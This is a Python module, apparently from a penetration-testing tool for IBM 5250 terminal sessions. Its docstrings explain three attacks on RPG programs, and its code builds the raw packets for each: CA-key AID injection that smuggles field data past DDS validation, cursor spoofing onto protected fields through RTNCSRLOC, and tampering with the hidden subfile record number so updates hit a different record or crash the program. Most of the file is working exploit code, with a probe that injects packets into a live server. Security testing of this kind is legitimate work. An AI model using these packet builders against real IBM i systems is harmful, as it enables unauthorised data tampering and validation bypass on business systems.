"""
RPG-layer attacks: CA-AID injection (B1), cursor spoofing (B2),
subfile RRN tampering (B3).

B1 — CAKeyInjector
  DDS function keys: CFnn transmits the buffer + runs DDS validation.
  CAnn sends AID byte ONLY — no data, no validation. Real emulators
  strip field data when sending a CA AID. The 5250 DATASTREAM doesn't
  enforce it. We send [cursor][CA-AID][SBA][data] — a shape no real
  emulator produces. RPG branching on *INKx for a CA key assumes the
  buffer is unchanged, skips re-validation, and EXFMT already deposited
  our data into program variables.

B2 — RTNCSRLOC cursor spoofing
  RTNCSRLOC(&RCD &FLD) makes the workstation manager translate inbound
  cursor row/col → DDS field name → RPG variable. Move the cursor to a
  protected field's coords; the program branches on a field name the
  user couldn't have clicked.

B3 — Subfile RRN tampering
  Subfile RRN travels as a hidden 4-digit zoned field. READC returns it;
  programs UPDATE SFLREC using the returned RRN. Tamper it → write into
  a different record. RRN=0 crashes EXFMT.
"""
import re
from typing import Optional
from hackterm_core import Screen, FieldWrite


# Conventional CA keys — these defaults are SO universal that IBM's own
# CUA standards mandate them. F3=Exit, F12=Cancel, F1=Help → CA always.
_CA_BY_CONVENTION = {"F1", "F3", "F12"}

# DDS validation error: CPD0078 = "Value for parameter not allowed"
# (VALUES/RANGE/COMP rejected). If we see this after a CA send, the
# key was actually CF or the program re-validates.
_VALIDATION_ERR = re.compile(r'\bCPD0078\b')


class CAKeyInjector:
    """Build CA-AID + field-data packets. The impossible-from-emulator shape.

    Workflow:
      1. classify_keys_from_screen() — guess CA vs CF from convention
      2. send_ca_with_data() — build the attack packet
      3. probe_ca_validation_skip() — confirm by sending KNOWN-INVALID
         data; if no validation error → CA-skip confirmed
    """

    def __init__(self, protocol):
        self.protocol = protocol

    def classify_keys_from_screen(self, screen: Screen) -> dict[str, str]:
        """Heuristic CA-vs-CF classification.

        We can't see CA-vs-CF on the wire (it's a DDS source keyword).
        Heuristics:
          - F1/F3/F12 → CA by IBM CUA convention (Exit/Cancel/Help)
          - Everything else → unknown until probed

        Future: parse screen text for "F3=Exit" / "F12=Cancel" labels
        and add those to the CA set. For now, convention is enough to
        target the highest-value cases.

        Returns: {key_name: "CA"|"unknown"} for F1-F24.
        """
        out = {}
        for n in range(1, 25):
            key = f"F{n}"
            out[key] = "CA" if key in _CA_BY_CONVENTION else "unknown"
        return out

    def send_ca_with_data(self, ca_aid: str, fields: list[tuple[int, int, str]],
                          cursor: tuple[int, int]) -> bytes:
        """THE ATTACK. Build [cursor][CA-AID][SBA r c data]+ [IAC EOR].

        This packet shape is impossible from a real emulator (CA keys
        don't transmit). The host's EXFMT will deposit field data into
        program variables, then the program branches on *INKx assuming
        the data is stale.

        Args:
          ca_aid: key name from AID_TABLE ("F3", "F12", ...)
          fields: list of (row, col, ascii_text) — each becomes SBA+EBCDIC
          cursor: where the cursor sits in the packet header

        Returns the raw packet bytes (NOT injected — caller decides).
        """
        aid = self.protocol.aid_table[ca_aid]  # KeyError on bad name — intentional
        writes = [
            FieldWrite(row=r, col=c, data=self.protocol.codec.to_ebcdic(t))
            for r, c, t in fields
        ]
        return self.protocol.build_inbound(aid, cursor, writes)

    def probe_ca_validation_skip(self, daemon, ca_aid: str,
                                 invalid_value: str,
                                 target_field: tuple[int, int],
                                 _response_screen: Optional[Screen] = None,
                                 timeout: float = 2.0) -> dict:
        """Send a KNOWN-INVALID value with a CA AID. Classify the response.

        If the program processes it without a validation error → CA-skip
        confirmed (the program trusted the CA path, didn't re-check).
        If we get CPD0078 or similar → the key was actually CF, or the
        program re-validates on CA paths (good for them, no finding).

        Args:
          _response_screen: TEST INJECTION ONLY — bypasses the daemon
            wait. Production callers leave this None.

        Returns: {classification, evidence, sent_packet_hex}
        """
        row, col = target_field
        pkt = self.send_ca_with_data(ca_aid, [(row, col, invalid_value)],
                                     cursor=target_field)
        daemon.inject_to_server(pkt)

        if _response_screen is None:
            # Live path: wait for next s2c, parse, read text.
            # (Polling loop deferred — same shape as state_fuzz._wait_for_response.)
            # Until then: fail loud rather than return a silent false positive.
            raise NotImplementedError(
                "live polling deferred — pass _response_screen for now")
        response_text = _response_screen.text

        if (m := _VALIDATION_ERR.search(response_text)):
            return {
                "classification": "CF_OR_REVALIDATES",
                "evidence": m.group(0),
                "sent_packet_hex": pkt.hex(),
            }
        return {
            "classification": "CA_SKIP_CANDIDATE",
            "evidence": response_text[:80],
            "sent_packet_hex": pkt.hex(),
        }


# ===========================================================================
# B2 — RTNCSRLOC cursor spoofing
# ===========================================================================

def build_field_position_map(screen: Screen) -> dict[tuple[int, int], int]:
    """(row, col) → field index.

    RTNCSRLOC translates cursor coords to DDS field name. We don't know
    the names, but we can address fields by their positional index and
    let the operator label them after the fact ("field 7 is the price").
    """
    return {(f.row, f.col): i for i, f in enumerate(screen.fields)}


def spoof_cursor_to_field(protocol, screen: Screen, target_field_idx: int,
                          aid: str = "ENTER") -> bytes:
    """Send AID with cursor at a SPECIFIC field's position.

    Typically a protected field — the user can't put the cursor there
    (it's not a tab stop), but the inbound packet doesn't know that.
    The workstation manager reports that field's name to the program
    via RTNCSRLOC, and the program branches on it.

    AID-only packet: just the cursor lie, no SBA. If you also want to
    send data, use CAKeyInjector.send_ca_with_data with the spoofed
    cursor — the two attacks compose.
    """
    target = screen.fields[target_field_idx]  # IndexError on bad idx — intentional
    return protocol.build_inbound(
        protocol.aid_table[aid],
        cursor=(target.row, target.col),
        fields=[],
    )


# ===========================================================================
# B3 — Subfile RRN tampering
# ===========================================================================

class SubfileRRNTamperer:
    """Detect and tamper the hidden subfile RRN field.

    RRN (relative record number) travels as a hidden 4-digit zoned
    field. READC returns it; the program does UPDATE SFLREC using it.
    Tamper RRN → option X applies to a different record than the
    operator sees. RRN=0 crashes EXFMT (CPF5068). RRN > loaded count
    may CHAIN-fail or skip silently.

    Detection needs TWO screens (before/after ROLLUP). RRN is the
    hidden field whose 4-zoned content incremented.
    """

    def detect_rrn_field(self, before: Screen, after: Screen) -> Optional[int]:
        """Find the hidden field whose zoned-decimal value incremented.

        Returns the field index, or None if no candidate. Index applies
        to BOTH screens (subfile screens have stable field structure).
        """
        for i, (b, a) in enumerate(zip(before.fields, after.fields)):
            if not b.hidden:
                continue
            if len(b.content) != 4 or len(a.content) != 4:
                continue
            # 4-digit zoned: every byte F0-F9
            if not all(0xF0 <= x <= 0xF9 for x in b.content):
                continue
            if not all(0xF0 <= x <= 0xF9 for x in a.content):
                continue
            # Did it increment? Decode zoned → int directly (low nibble).
            val_b = int("".join(str(x & 0x0F) for x in b.content))
            val_a = int("".join(str(x & 0x0F) for x in a.content))
            if val_a > val_b:
                return i
        return None

    def tamper_rrn(self, protocol, rrn_field: tuple[int, int],
                   option_field: tuple[int, int], option_value: str,
                   target_rrn: int, aid: str = "ENTER") -> bytes:
        """Build option=X at visible row + RRN=target_rrn at hidden field.

        Two SBA blocks. Cursor on the option field (where it would be
        if the user actually typed). The host can't tell which SBA is
        'legitimate' — same as the Mels Cargo multi-field tamper.

        target_rrn=0 → likely EXFMT crash (CPF5068).
        target_rrn > loaded count → CHAIN fails, may abend or skip.
        """
        rrn_text = str(target_rrn).zfill(4)  # codec.to_ebcdic('9') = 0xF9 (zoned)
        return protocol.build_inbound(
            protocol.aid_table[aid],
            cursor=option_field,
            fields=[
                FieldWrite(row=option_field[0], col=option_field[1],
                           data=protocol.codec.to_ebcdic(option_value)),
                FieldWrite(row=rrn_field[0], col=rrn_field[1],
                           data=protocol.codec.to_ebcdic(rrn_text)),
            ],
        )

